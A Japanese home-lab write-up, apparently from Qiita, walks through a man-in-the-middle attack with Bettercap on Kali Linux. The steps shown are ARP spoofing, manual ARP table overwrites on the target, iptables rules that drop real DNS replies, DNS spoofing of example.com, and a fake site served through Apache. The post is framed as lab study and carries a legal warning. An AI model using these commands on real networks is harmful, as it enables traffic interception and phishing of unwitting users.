---
title: "サイバーキルチェーンで学ぶ中間者攻撃（MitM）実践：Bettercapを使ったDNSスプーフィングと偽Webサイト誘導の検証"
date: 2026-09-19
tags: ["vulnerability", "bettercap", "ARP", "dns", "KaliLinux", "Security"]
source: "https://qiita.com/ohtsuka-shota/items/dc6af0966aa835954523"
---
# はじめに
:::note warn
警告
本記事の内容は自宅ラボ内の隔離環境、および自分が所有・管理する仮想マシンに対してのみ実施しています。他人が管理するシステムに対して同様の行為を行うことは、不正アクセス禁止法などの法律に違反する可能性があります。本記事は検証目的に限定しており、悪用を推奨するものではありません。
:::

## サイバーキルチェーンで見る本記事の位置づけ
| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ③配送（Delivery） | 攻撃の実施 | ARPスプーフィングにより標的とゲートウェイ間の通信を中間者経路に誘導 |
| ④脆弱性の悪用（Exploitation） | 通信の傍受・改ざん | DNSスプーフィングにより正規ドメインへのDNSクエリを攻撃者制御下のIPアドレスに偽装応答 |
| ⑦目的の実行（Actions on Objectives） | 目的の達成 | ターゲットが正規ドメインにアクセスしたつもりで攻撃者の偽装Webサーバへ誘導され、中間者攻撃（MITM）が成立 |

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)

# 用語
## bettercap
### 概要
Bettercapは、ネットワークのセキュリティ監査やペネトレーションテストに使用されるオープンソースのフレームワークです。Go言語で開発されており、従来のツールであったEttercapの後継として位置づけられています。

https://www.kali.org/tools/bettercap/

### 主な特徴

- **モジュラー設計**: 必要な機能をモジュールとして読み込む柔軟な構造
- **クロスプラットフォーム**: Linux、macOS、Windows、ARM系デバイスに対応
- **リアルタイム処理**: ネットワークトラフィックをリアルタイムで監視・解析

### 主要機能

#### 1. ネットワーク探索
- ローカルネットワーク上のデバイスを自動検出
- ホストのOS、オープンポート、サービスの情報収集

#### 2. MITMアタック (Man-in-the-Middle)
- ARP Spoofing、DNS Spoofing
- HTTPSトラフィックのインターセプト（SSL Stripping）
- プロキシ機能によるトラフィックの書き換え

#### 3. Wi-Fiセキュリティ監査
- ワイヤレスネットワークのスキャン
- WPA/WPA2ハンドシェイクのキャプチャ
- デバイスのデauthentication攻撃

#### 4. パケットキャプチャ
- 認証情報のスニッフィング
- クッキーやセッショントークンの取得
- HTTPリクエスト/レスポンスの監視

#### 5. その他
- Bluetooth Low Energy (BLE) デバイスのスキャン
- GPS位置情報の追跡
- HIDデバイスのエミュレーション

## ARPスプーフィング
ローカルネットワーク内で偽のARP応答を送信し、IPアドレスとMACアドレスの対応を書き換えることで、通信を傍受したり中継攻撃を行う手法。攻撃者は自身のMACアドレスをゲートウェイやターゲットホストになりすまして送信し、被害者の通信を自分経由にルーティングさせる。

## DNSスプーフィング
DNS応答を偽装して、正規のドメイン名に対して攻撃者が用意した不正なIPアドレスを返す攻撃。ユーザーが正しいドメインにアクセスしようとしても、偽サイトに誘導されフィッシングやマルウェア配布の被害に遭う。キャッシュポイズニングやman-in-the-middle攻撃と組み合わせて使われることが多い。

# 環境構成
## 全体構成
緑が正規通信フロー、赤がスプーフィングの結果行われる偽装通信フローになります。
![](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img01.png)

## 攻撃対象環境
以下の手順でubutnuを使用してDesktop環境とDNSサーバ周り、Webサーバの環境を整えています。
DNSはDesktopが問い合わせを投げるDNSキャッシュサーバ及びDNSキャッシュが名前解決を行うルート/TLD/権威DNSを用意して名前解決できるようにしています。

[[dns-root-tld-authoritative-cache]]#%E6%9C%80%E7%B5%82%E7%A2%BA%E8%AA%8D

DesktopにはキャッシュDNSサーバに問い合わせを投げるように設定をしています。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/26056988-7613-4b5d-a138-ecdca86b21b5.png)

実際にWebブラウザ（今回はFirefox）を使用してhttp\:://www.example.comにアクセスすると名前解決が行われ、用意したWebサーバにアクセスできる状態です。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/25d01c90-df11-4dbe-a330-df408fb29078.png)

# 攻撃内容
## bettercapのインストール
私のkali環境だとbettercapがインストールされていなかったので、以下のコマンドでインストールを行います。
インストール後--versionオプションを実行してバージョンが表示されることを確認します。表示されれば正常インストールが出来ております。
```
# apt install -y bettercap
# bettercap --version
bettercap v2.41.5 (built for linux amd64 with go1.24.9)
```

## 侵入しているネットワークの通信傍受
bettercapインストール後、以下のコマンドを使って侵入しているネットワークの通信を傍受します。
net.probe onでネットワークプローブ機能を有効化します。簡単に言うと「誰がこのネットワーク上にいるか」を調べます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/44c6c10a-9db8-4fab-8596-b2a10c9d2a55.png)
```
# bettercap          
bettercap v2.41.5 (built for linux amd64 with go1.24.9) [type 'help' for a list of commands]

192.168.0.0/24 > 192.168.0.25  » net.probe on
[12:02:23] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe

192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.38 detected as bc:24:11:59:57:2e (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.49 detected as bc:24:11:8d:f7:07 (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.50 detected as bc:24:11:3b:3f:2b (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.51 detected as bc:24:11:8e:95:7a (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.53 detected as bc:24:11:e3:6e:f4 (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.54 detected as bc:24:11:9d:04:85 (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [12:02:23] [endpoint.new] endpoint 192.168.0.62 detected as bc:24:11:15:1d:4f (Proxmox Server Solutions GmbH).
```

net.showで結果を確認できます。
結果を見ている感じ、間違いはないように見えます。
net.probe onを実行したすぐにこれをやると、見つかってないデバイスがある可能性があるので、2,3分待ってから行うと良い気がします。
![image.png](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img02.png)

## 【MITM/中間者攻撃】ターゲットを指定してARPスプーフィングを行う（失敗）
以下のコマンドを実行してターゲットに対してARPスプーフィングを仕掛けます。IPアドレスは攻撃対象のIPアドレスを指定します。
このARPスプーフはターゲットが指定しているデフォルトゲートウェイに化けています。
これにより、ターゲット端末が外部（DNSサーバやWebサイトなど）へ送信しようとする通信が、すべて一度Kaliを経由するようになります（通信の間に割り込む中間者状態を作ります）。
```
» set arp.spoof.targets 192.168.0.62
» arp.spoof on
[12:27:36] [sys.log] [inf] arp.spoof enabling forwarding
```

攻撃対象側でip neighを実行します。
arpスプーフが実行されていないとデフォルトゲートウェイ（xxx.xxx.xxx.1）のMACが正しいものとなっています。今回は"00:10:18:xx:xx:xx"です
![image.png](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img03.png)

この状態で例えば外に抜ける通信を発生させます。
こうすることでMACがkaliのものに書き換わりARPスプーフィングが完成するはずです。
```
ping 8.8.8.8
```

実行結果は以下です。書き換わってないので失敗してます。
依然として192.168.0.1 dev ens18 lladdr 00:10:18:xx:xx:xx REACHABLEとなっています。
![image.png](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img04.png)


## 【MITM/中間者攻撃】ARPスプーフィングの失敗に対する対応 ※全部うまくいかなかった
原因は以下にあるようです。
※なお、これらを試しましたが全部失敗しました。現代のOSやインフラ環境はARP偽装に対してかなり堅牢のように思いました。
- ① bettercapのfullduplexがfalse状態 
- ② Proxmoxのファイアウォールが有効化状態
- ③ Linuxの未要求ARP（Gratuitous ARP）受け入れ無効化状態
- ④ 攻撃対象のゲートウェイ設定がDHCP経由になっている
### ① bettercapのfullduplexをtrueにする対応
BettercapのARPスプーフィングモジュールには、片方向のみを偽装する「ハーフデュプレックス（Half Duplex）」と、双方を偽装する「フルデュプレックス（Full Duplex）」の2つのモードが存在します。

* **`fullduplex: false`（ハーフデュプレックス / デフォルト）**:
  * 「ターゲット端末 ➔ ゲートウェイ（ルーター）」の方向のみを偽装します。
  * 戻りの通信（ルーターからターゲット宛て）はKaliを経由しないため、環境によっては通信が片道通行になり、ネットワークが不通になったりARPテーブルが不安定になったりします。
* **`fullduplex: true`（フルデュプレックス）**:
  * ターゲット端末に対しては「ルーターのMACはKaliだよ」と偽装し、同時にルーターに対しても「ターゲット端末のMACはKaliだよ」と偽装します。
  * これにより、往復（双方向）の通信すべてをKali経由に引き込み、通信の切断を防ぎます。

最初の設定ではfullduplexがfalseになっていました。
```
» active
arp.spoof (Keep spoofing selected hosts on the network.)

  arp.spoof.skip_restore : false
  arp.spoof.targets : 192.168.0.62
  arp.spoof.whitelist : 
  arp.spoof.internal : false
  arp.spoof.fullduplex : false
```

これを以下のコマンドでfullduplexにしています。
```
» arp.spoof off
[12:51:12] [sys.log] [inf] arp.spoof waiting for ARP spoofer to stop ...
[12:51:12] [sys.log] [inf] arp.spoof restoring ARP cache of 1 targets.

» set arp.spoof.fullduplex true

>> arp.spoof on
192.168.0.0/24 > 192.168.0.25  » [12:51:48] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
192.168.0.0/24 > 192.168.0.25  » [12:51:48] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
```

### ② Proxmoxのファイアウォールを無効化状態にする
またProxmox上にあるKali VMのネットワークデバイスのFirewallの設定からチェックを外します。
ARPスプーフィングによって通信経路がKaliを経由し始めたことで、外部からの直接RDPセッションが切断・不安定になるので、RDPではなくPVEのコンソールから操作すると良いでしょう。RDPが全く出来なくなるわけでは無さそうです。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/dd497203-49dc-49e5-94c0-3f1b1d948f14.png)
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/bd4b6457-521c-4e5b-bc5c-fa947a35eeda.png)

### ③ Linuxの未要求ARP（Gratuitous ARP）受け入れを有効化する
Linuxカーネルには、セキュリティ保護のため「自分が要求していない不審なARP応答（Gratuitous ARP）を受け取っても無視する」という仕様（デフォルト値 `0`）が備わっています。Bettercapなどのツールは未要求の偽装ARPパケットを送りつけてARPテーブルを書き換えようとするため、ターゲット側のこの保護機能が働いていると書き換えが弾かれてしまいます。
まずは現在の設定値を確認します。0になっていますね。デフォルトでは無視するようになっています。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/dbc74484-63ef-42ee-98a3-c15ea51689a2.png)

これを1にします。これで無視しない状態に変更します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/5d6c628e-5604-489e-b334-57d1ca831dcd.png)

## ④攻撃対象のゲートウェイ設定をDHCP経由ではなく手動で設定する
デフォゲの設定をDHCPで行っていたので、これを手動に変更します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/391c3745-df15-40b1-9484-f2f48173c675.png)

変更した結果が以下です。
攻撃対象が感づかないようにするためにIPアドレスとデフォルゲのIPアドレスはDHCPから受け取ったものと同じにしてます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/361e4ae9-2384-473e-b022-49cd9ca7f350.png)

### ARPスプーフィングの実行結果確認
これらの対応を施してみましたが、ARPスプーフィングはうまくいきませんでした。
![image.png](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img05.png)

kaliのMACは以下になります。うまくいっておりません。
かなり堅牢のように思います。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/d72872c5-5dce-4001-90fa-c4bc90738567.png)

## 【MITM/中間者攻撃】ARPテーブルの手動書き換えによる中間者状態の再現
ARPスプーフィングについてはPVEや各VMに紐づいているFirewall等を確認してもダメだったので、自動での書き換えは諦めて攻撃対象側で手動で書き換えていきたいと思います。例えばMetasploitとか他の方法で不正アクセス・権限昇格を行って、以下のコマンドを実行して固定に書き換えを行うのが妥当のように思います。
```
# ターゲット端末で実行（ゲートウェイ宛ての通信をKaliに固定）
ip neigh replace 192.168.0.1 lladdr bc:24:11:7f:e1:f8 dev ens18
```

ip neighでMACがkaliのMACになりました。ステータスが「PERMANENT（永続）」となり、OSのキャッシュ更新やルーターからの正規パケットによる上書きを受けない固定設定になっていることが確認できます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/14831613-0d5d-49a9-841b-eb5d40393076.png)

また、arp.spoofがonになっているとDNSサーバのMACもkaliに書き換わるのですが、ARPスプーフィングが上手くいかないので、DNSのMACも書き換えます。
```
# ターゲット端末で実行（DNS宛ての通信をKaliに固定）
ip neigh replace 192.168.0.53 lladdr bc:24:11:7f:e1:f8 dev ens18
```

同じくip neighでMACがkaliのものになっていることがわかります。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/144703fc-7cc4-46da-84ee-509504ab43f4.png)

## 【MITM/中間者攻撃】ターゲットを指定してDNSスプーフィングを行う
まず、kali側で以下のコマンドを実行します。（Bettercapは一応停止しておきましょう。）
これを実行することでターゲットからDNSサーバに対してクエリが届かなくなり、Bettercapからの偽装DNS応答だけがターゲットに到達するようになります。
※デフォルトだとKaliからDNSに転送されて、その正規回答がターゲットに飛んでしまうようです。レースコンディションに負けるというみたいです。
```
# iptables -A FORWARD -d 192.168.0.53 -p udp --dport 53 -j DROP
# iptables -A FORWARD -s 192.168.0.53 -p udp --sport 53 -j DROP
```

次にBettercapを起動してDNSスプーフィングの設定を行い、起動します。
dns.spoof.all trueを実行しておかないとDNSチェイスで正規IPを正規DNSに送られてスプーフィングが失敗します。
```
>> bettercap 
>> net.probe on
>> set dns.spoof.domains example.com,*.example.com
>> set dns.spoof.address 192.168.0.25
>> set dns.spoof.all true
» dns.spoof on
[14:36:02] [sys.log] [inf] dns.spoof example.com -> 192.168.0.25
» active
arp.spoof (Keep spoofing selected hosts on the network.)

  arp.spoof.targets : 192.168.0.62
  arp.spoof.whitelist : 
  arp.spoof.internal : true
  arp.spoof.fullduplex : true
  arp.spoof.skip_restore : false

dns.spoof (Replies to DNS messages with spoofed responses.)

  dns.spoof.domains : example.com,*.example.com
  dns.spoof.address : 192.168.0.25
  dns.spoof.all : true
  dns.spoof.ttl : 1024
  dns.spoof.hosts : 
```
以下のような状態になっているはずです。
※以下のスクショはARPスプーフィングも実際に行えた場合のatcive出力結果です。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/afcb81a9-f382-4d62-a96b-2e7cf74f36c6.png)

　今回の様にARPスプーフィングが出来ずに手動でMACを設定した場合は以下になります。arp.spoofは起動していなくて問題ありませんでした。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/5025b193-8c1b-4e66-86c2-888049be3e20.png)

別のシェルを立ち上げてPythonでテストWebサーバを立ち上げておきます。
```
# python3 -m http.server 80
```

続いて攻撃対象のFirefoxの設定を無効化したりキャッシュをクリアしたりします。
Firefox右上のハンバーガーメニューから設定を押下します。
設定画面からプライバシーとセキュリティを開いて下にあるDNS over HTTPSを無効化します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/1caabdad-63a4-4dbd-8064-71685fc5c243.png)

またキャッシュをクリアします。履歴を押下して、最近の履歴を消去画面をひらきます。
全ての履歴を指定して消去します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/47eceb13-c83a-41b0-8c8d-4135ec8e166d.png)

## 不正サイトにアクセスしていることの確認
ターゲット側でnslookupを実行して名前解決の結果、正規IPではないIPが返ってきていることを確認します。
resolvectl flush-cachesでキャッシュを消した後nslookupを仕掛けます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7519b4a6-10b7-4ff8-a623-85f538ebd9b4.png)

この時Bettercap側に名前解決の通信が来ていることがわかります。
```
192.168.0.0/24 > 192.168.0.25  » [16:24:35] [sys.log] [inf] dns.spoof sending spoofed DNS reply for www.example.com (->192.168.0.25) to 192.168.0.62 : bc:24:11:15:1d:4f (Proxmox Server Solutions GmbH).
192.168.0.0/24 > 192.168.0.25  » [16:24:35] [sys.log] [inf] dns.spoof sending spoofed DNS reply for www.example.com (->192.168.0.25) to 192.168.0.62 : bc:24:11:15:1d:4f (Proxmox Server Solutions GmbH).
```
![](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img06.png)

Firefox側で通信を行います。正しいWebサーバではなくKaliで実行しているダミーのWebサイトに飛んでいることがわかります。
![](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img07.png)

例えばこの状態でkali側でApacheを導入して本物を模倣したHTMLファイルを用意したうえでサイト公開をしてみます。
```
# apt install -y apache2
# systemctl start apache2  
# cp -p /var/www/html/index.html /var/www/html/index.html.org
# nano /var/www/html/index.html
# chmod 644 /var/www/html/index.html
# chown www-data:www-data /var/www/html/index.html
systemctl restart apache2
```

ターゲットで確認します。正規ドメインでアクセスしていますが、攻撃者が用意したWebページにアクセスしてしまっていることがわかります。
![](脆弱性/cyber-kill-chain-mitm-bettercap-dns-spoofing-images/img08.png)

